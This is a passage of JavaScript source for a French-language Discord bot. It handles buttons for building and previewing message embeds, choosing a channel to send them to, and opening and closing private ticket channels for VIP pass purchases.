        if (['set_title', 'set_description', 'set_color', 'set_image', 'set_footer'].includes(interaction.customId)) {
            const typeMap = {
                set_title: ['Titre', 'modalTitle'],
                set_description: ['Description', 'modalDesc'],
                set_color: ['Couleur (Hex)', 'modalColor'],
                set_image: ['Image (URL)', 'modalImage'],
                set_footer: ['Footer', 'modalFooter']
            };

            const [label, modalType] = typeMap[interaction.customId];
            const modal = new ModalBuilder()
                .setCustomId(`${modalType}_${userId}`)
                .setTitle(`Configurer : ${label}`);

            const input = new TextInputBuilder()
                .setCustomId('input')
                .setLabel(label)
                .setStyle(interaction.customId === 'set_description' ? TextInputStyle.Paragraph : TextInputStyle.Short)
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(input));
            return await interaction.showModal(modal);
        }

        if (interaction.customId === 'preview_embed') {
            const data = embedData.get(userId);
            if (!data) return interaction.reply({ content: 'L\'embed est vide.', flags: [MessageFlags.Ephemeral] });

            const preview = new EmbedBuilder()
                .setColor(data.color || 0xFFFFFF)
                .setTitle(data.title || 'Sans titre')
                .setDescription(data.description || 'Sans description')
                .setImage(data.image || null)
                .setFooter(data.footer ? { text: data.footer } : null);

            return await interaction.reply({ content: 'Voici un aperçu :', embeds: [preview], flags: [MessageFlags.Ephemeral] });
        }

        if (interaction.customId === 'send_embed') {
            const data = embedData.get(userId);
            if (!data || (!data.title && !data.description)) {
                return interaction.reply({ content: 'L\'embed doit avoir au moins un titre ou une description.', flags: [MessageFlags.Ephemeral] });
            }

            const channels = interaction.guild.channels.cache
                .filter(c => c.type === ChannelType.GuildText)
                .first(25);

            const select = new StringSelectMenuBuilder()
                .setCustomId(`sendToChannel_${userId}`)
                .setPlaceholder('Choisir le salon...')
                .addOptions(channels.map(c => ({ label: c.name, value: c.id })));

            await interaction.reply({ content: 'Sélectionnez le salon d\'envoi :', components: [new ActionRowBuilder().addComponents(select)], flags: [MessageFlags.Ephemeral] });
        }

        if (interaction.customId === 'open_ticket') {
        const guild = interaction.guild;
        const channelName = `ticket-${interaction.user.username}`;
        
        // Create channel
        const channel = await guild.channels.create({
            name: channelName,
            type: 0, // GuildText
            permissionOverwrites: [
                {
                    id: guild.id,
                    deny: [PermissionsBitField.Flags.ViewChannel],
                },
                {
                    id: interaction.user.id,
                    allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory],
                },
                // Add staff role if exists, or just leave for admins
            ],
        });

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Ticket Ouvert')
            .setDescription(`Bonjour ${interaction.user}, un membre du staff va s'occuper de vous pour votre achat de Pass VIP.`)
            .setFooter({ text: 'Utilisez le bouton ci-dessous pour fermer le ticket.' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('close_ticket')
                .setLabel('Fermer le ticket')
                .setStyle(ButtonStyle.Danger)
        );

        await channel.send({ embeds: [embed], components: [row] });
        await interaction.reply({ content: `Votre ticket a été créé : ${channel}`, flags: [MessageFlags.Ephemeral] });
    }

    if (interaction.customId === 'close_ticket') {
        await interaction.reply('Le ticket va être fermé dans 5 secondes...');
        setTimeout(() => interaction.channel.delete(), 5000);
    }
    }
    } catch (error) {
        logError(error, 'Event: interactionCreate');
    }
});

client.login(process.env.TOKEN);
